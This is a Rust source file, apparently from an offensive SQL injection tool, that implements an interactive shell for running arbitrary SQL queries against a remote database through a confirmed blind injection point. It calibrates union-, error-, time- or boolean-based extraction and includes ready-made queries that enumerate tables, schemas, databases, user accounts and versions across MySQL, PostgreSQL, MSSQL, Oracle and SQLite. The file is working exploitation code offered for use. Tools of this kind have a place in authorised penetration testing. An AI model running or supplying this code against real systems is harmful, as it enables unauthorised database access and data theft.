//! Interactive SQL shell via blind SQL injection.
//!
//! Provides a REPL interface that executes SQL queries against the target
//! database through a confirmed SQL injection vulnerability.

use anyhow::{Context, Result};
use std::io::Write;
use tracing::{debug, info, warn};

use crate::sqx::{
    detector::SqliDetector,
    models::HttpResponse,
    shell::fast_extract::{AdaptiveExtractor, FastTechnique},
    shell::types::{ShellConfig, ShellResult, ShellSession, ShellTechnique},
};

/// Interactive SQL shell.
pub struct SqlShell<'a> {
    detector: &'a SqliDetector,
    url: String,
    param: String,
    original_value: String,
    dbms: String,
    config: ShellConfig,
    session: ShellSession,
    baseline: HttpResponse,
    extractor: AdaptiveExtractor,
    current_technique: Option<FastTechnique>,
}

impl<'a> SqlShell<'a> {
    /// Create a new SQL shell instance.
    pub async fn new(
        detector: &'a SqliDetector,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: ShellConfig,
    ) -> Result<Self> {
        info!("Initializing SQL shell for {} on {}", dbms, url);

        // Get baseline for extraction
        let baseline = detector
            .send_request(url)
            .await
            .context("Failed to get baseline request")?;

        Ok(Self {
            detector,
            url: url.to_string(),
            param: param.to_string(),
            original_value: original_value.to_string(),
            dbms: dbms.to_string(),
            config,
            session: ShellSession::new(),
            baseline,
            extractor: AdaptiveExtractor::new(),
            current_technique: None,
        })
    }

    /// Run the interactive REPL.
    pub async fn run_repl(&mut self) -> Result<()> {
        // Calibrate extraction technique
        println!("[*] Calibrating extraction technique...");
        self.extractor
            .calibrate(
                self.detector,
                &self.url,
                &self.param,
                &self.original_value,
                &self.dbms,
                &self.baseline,
            )
            .await?;

        println!("╔═══════════════════════════════════════════════════════════════╗");
        println!("║              SQX Interactive SQL Shell                        ║");
        println!("╠═══════════════════════════════════════════════════════════════╣");
        println!("║  DBMS: {:55} ║", self.dbms);
        println!("║  URL:  {:55} ║", self.url.chars().take(55).collect::<String>());
        
        // Show calibrated technique
        if let Some(tech) = self.extractor.preferred_technique {
            println!("║  Technique: {:49} ║", tech.to_string());
            self.current_technique = Some(tech);
        }
        
        println!("╚═══════════════════════════════════════════════════════════════╝");
        println!();
        println!("Type SQL queries to execute. Special commands:");
        println!("  .tables          - List tables");
        println!("  .schema <table>  - Show table schema");
        println!("  .databases       - List databases");
        println!("  .users           - List database users");
        println!("  .version         - Show DBMS version");
        println!("  .technique      - Show current extraction technique");
        println!("  .calibrate      - Recalibrate extraction technique");
        println!("  .help            - Show this help");
        println!("  .exit            - Exit shell");
        println!();

        let stdin = std::io::stdin();
        let mut stdout = std::io::stdout();

        loop {
            print!("sql> ");
            stdout.flush()?;

            let mut input = String::new();
            stdin.read_line(&mut input)?;
            let input = input.trim();

            if input.is_empty() {
                continue;
            }

            // Handle special commands
            if input.starts_with('.') {
                match self.handle_meta_command(input).await {
                    Ok(should_exit) => {
                        if should_exit {
                            break;
                        }
                    }
                    Err(e) => {
                        eprintln!("[!] Error: {}", e);
                    }
                }
                continue;
            }

            // Execute SQL query with timing
            let start = std::time::Instant::now();
            match self.execute_sql(input).await {
                Ok(result) => {
                    self.session.add_entry(
                        input.to_string(),
                        result.output.clone(),
                        result.success,
                    );
                    self.session.add_requests(result.requests);

                    let elapsed = start.elapsed();
                    if result.success {
                        println!("{}", result.output);
                        println!("-- {} requests in {:?} --", result.requests, elapsed);
                    } else {
                        eprintln!("[!] Query failed: {}", result.output);
                    }
                }
                Err(e) => {
                    eprintln!("[!] Execution error: {}", e);
                }
            }
        }

        println!("\n[*] SQL shell session ended.");
        println!("[*] Total requests: {}", self.session.total_requests);
        println!("[*] Commands executed: {}", self.session.history.len());
        Ok(())
    }

    /// Handle meta-commands (starting with .)
    async fn handle_meta_command(&mut self, cmd: &str) -> Result<bool> {
        let parts: Vec<&str> = cmd.split_whitespace().collect();
        let command = parts.first().copied().unwrap_or("");

        match command {
            ".exit" | ".quit" => {
                println!("[*] Exiting...");
                return Ok(true);
            }
            ".help" => {
                println!("Special commands:");
                println!("  .tables          - List tables");
                println!("  .schema <table>  - Show table schema");
                println!("  .databases       - List databases");
                println!("  .users           - List database users");
                println!("  .version         - Show DBMS version");
                println!("  .technique       - Show current extraction technique");
                println!("  .calibrate       - Recalibrate extraction technique");
                println!("  .status          - Show session status");
                println!("  .help            - Show this help");
                println!("  .exit            - Exit shell");
            }
            ".tables" => {
                let sql = self.get_tables_query();
                match self.execute_sql(&sql).await {
                    Ok(result) => {
                        let count = self.count_lines(&result.output);
                        println!("{}", result.output);
                        println!("-- {} tables --", count);
                    }
                    Err(e) => eprintln!("[!] Failed to list tables: {}", e),
                }
            }
            ".schema" => {
                if parts.len() < 2 {
                    eprintln!("[!] Usage: .schema <table_name>");
                } else {
                    let table = parts[1];
                    let sql = self.get_schema_query(table);
                    match self.execute_sql(&sql).await {
                        Ok(result) => println!("{}", result.output),
                        Err(e) => eprintln!("[!] Failed to get schema: {}", e),
                    }
                }
            }
            ".databases" => {
                let sql = self.get_databases_query();
                match self.execute_sql(&sql).await {
                    Ok(result) => {
                        let count = self.count_lines(&result.output);
                        println!("{}", result.output);
                        println!("-- {} databases --", count);
                    }
                    Err(e) => eprintln!("[!] Failed to list databases: {}", e),
                }
            }
            ".users" => {
                let sql = self.get_users_query();
                match self.execute_sql(&sql).await {
                    Ok(result) => {
                        let count = self.count_lines(&result.output);
                        println!("{}", result.output);
                        println!("-- {} users --", count);
                    }
                    Err(e) => eprintln!("[!] Failed to list users: {}", e),
                }
            }
            ".version" => {
                let sql = self.get_version_query();
                match self.execute_sql(&sql).await {
                    Ok(result) => println!("{}", result.output),
                    Err(e) => eprintln!("[!] Failed to get version: {}", e),
                }
            }
            ".technique" => {
                if let Some(tech) = self.current_technique {
                    println!("Current extraction technique: {}", tech);
                    match tech {
                        FastTechnique::Union => println!("  Speed: ~1 request per query (FAST)"),
                        FastTechnique::Error => println!("  Speed: ~1 request per query (FAST)"),
                        FastTechnique::Time => println!("  Speed: ~7-8 requests per character (SLOW)"),
                        FastTechnique::Boolean => println!("  Speed: ~7-8 requests per character (SLOW)"),
                    }
                } else {
                    println!("No technique calibrated yet. Run .calibrate first.");
                }
            }
            ".calibrate" => {
                println!("[*] Recalibrating extraction technique...");
                match self.extractor.calibrate(
                    self.detector,
                    &self.url,
                    &self.param,
                    &self.original_value,
                    &self.dbms,
                    &self.baseline,
                ).await {
                    Ok(_) => {
                        if let Some(tech) = self.extractor.preferred_technique {
                            println!("[+] Calibrated to: {}", tech);
                            self.current_technique = Some(tech);
                        }
                    }
                    Err(e) => eprintln!("[!] Calibration failed: {}", e),
                }
            }
            ".status" => {
                println!("Session status:");
                println!("  DBMS: {}", self.dbms);
                if let Some(tech) = self.current_technique {
                    println!("  Technique: {}", tech);
                }
                println!("  Total requests: {}", self.session.total_requests);
                println!("  Commands executed: {}", self.session.history.len());
                if let Some(start) = self.session.start_time {
                    let duration = chrono::Utc::now() - start;
                    println!("  Session duration: {}m {}s", duration.num_minutes(), duration.num_seconds() % 60);
                }
            }
            _ => {
                eprintln!("[!] Unknown command: {}. Type .help for available commands.", command);
            }
        }

        Ok(false)
    }

    /// Execute a SQL query and return the result.
    pub async fn execute_sql(&self, sql: &str) -> Result<ShellResult> {
        debug!("Executing SQL: {}", sql);

        // Use adaptive extractor with calibration
        let result = self.extractor.extract(
            self.detector,
            &self.url,
            &self.param,
            &self.original_value,
            &self.dbms,
            sql,
            &self.baseline,
            self.config.max_output_length,
        ).await?;

        let success = !result.output.is_empty();
        Ok(ShellResult {
            command: sql.to_string(),
            output: result.output,
            success,
            requests: result.requests,
            duration_ms: 0,
        })
    }

    // DBMS-specific query builders

    fn get_tables_query(&self) -> String {
        let dbms = self.dbms.to_lowercase();
        match dbms.as_str() {
            "mysql" | "mariadb" => {
                "SELECT GROUP_CONCAT(table_name SEPARATOR '\\n') FROM information_schema.tables WHERE table_schema=DATABASE()".to_string()
            }
            "postgresql" | "postgres" => {
                "SELECT STRING_AGG(table_name, E'\\n') FROM information_schema.tables WHERE table_schema='public'".to_string()
            }
            "mssql" | "sqlserver" => {
                "SELECT STRING_AGG(name, '\\n') FROM sys.tables".to_string()
            }
            "oracle" => {
                "SELECT LISTAGG(table_name, '\\n') WITHIN GROUP (ORDER BY table_name) FROM user_tables".to_string()
            }
            "sqlite" => {
                "SELECT GROUP_CONCAT(name, '\\n') FROM sqlite_master WHERE type='table'".to_string()
            }
            _ => "SELECT 'Unsupported DBMS'".to_string(),
        }
    }

    fn get_schema_query(&self, table: &str) -> String {
        let dbms = self.dbms.to_lowercase();
        match dbms.as_str() {
            "mysql" | "mariadb" => {
                format!("SELECT GROUP_CONCAT(CONCAT(column_name, ' ', data_type) SEPARATOR '\\n') FROM information_schema.columns WHERE table_name='{}' AND table_schema=DATABASE()", table)
            }
            "postgresql" | "postgres" => {
                format!("SELECT STRING_AGG(column_name || ' ' || data_type, E'\\n') FROM information_schema.columns WHERE table_name='{}'", table)
            }
            "mssql" | "sqlserver" => {
                format!("SELECT STRING_AGG(c.name + ' ' + t.name, '\\n') FROM sys.columns c JOIN sys.types t ON c.user_type_id=t.user_type_id WHERE c.object_id=OBJECT_ID('{}')", table)
            }
            "oracle" => {
                format!("SELECT LISTAGG(column_name || ' ' || data_type, '\\n') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name=UPPER('{}')", table)
            }
            "sqlite" => {
                format!("SELECT sql FROM sqlite_master WHERE type='table' AND name='{}'", table)
            }
            _ => "SELECT 'Unsupported DBMS'".to_string(),
        }
    }

    fn get_databases_query(&self) -> String {
        let dbms = self.dbms.to_lowercase();
        match dbms.as_str() {
            "mysql" | "mariadb" => {
                "SELECT GROUP_CONCAT(schema_name SEPARATOR '\\n') FROM information_schema.schemata".to_string()
            }
            "postgresql" | "postgres" => {
                "SELECT STRING_AGG(datname, E'\\n') FROM pg_database WHERE datistemplate=false".to_string()
            }
            "mssql" | "sqlserver" => {
                "SELECT STRING_AGG(name, '\\n') FROM sys.databases".to_string()
            }
            "oracle" => {
                r"SELECT LISTAGG(name, CHR(10)) WITHIN GROUP (ORDER BY name) FROM v$database".to_string()
            }
            _ => "SELECT 'Unsupported DBMS'".to_string(),
        }
    }

    fn get_users_query(&self) -> String {
        let dbms = self.dbms.to_lowercase();
        match dbms.as_str() {
            "mysql" | "mariadb" => {
                "SELECT GROUP_CONCAT(user SEPARATOR '\\n') FROM mysql.user".to_string()
            }
            "postgresql" | "postgres" => {
                "SELECT STRING_AGG(usename, E'\\n') FROM pg_user".to_string()
            }
            "mssql" | "sqlserver" => {
                "SELECT STRING_AGG(name, '\\n') FROM sys.sql_logins".to_string()
            }
            "oracle" => {
                "SELECT LISTAGG(username, '\\n') WITHIN GROUP (ORDER BY username) FROM all_users".to_string()
            }
            _ => "SELECT 'Unsupported DBMS'".to_string(),
        }
    }

    fn get_version_query(&self) -> String {
        let dbms = self.dbms.to_lowercase();
        match dbms.as_str() {
            "mysql" | "mariadb" => "SELECT VERSION()".to_string(),
            "postgresql" | "postgres" => "SELECT version()".to_string(),
            "mssql" | "sqlserver" => "SELECT @@VERSION".to_string(),
            "oracle" => "SELECT * FROM v$version".to_string(),
            "sqlite" => "SELECT sqlite_version()".to_string(),
            _ => "SELECT 'Unknown'".to_string(),
        }
    }

    fn count_lines(&self, text: &str) -> usize {
        if text.is_empty() {
            0
        } else {
            text.lines().count()
        }
    }
}
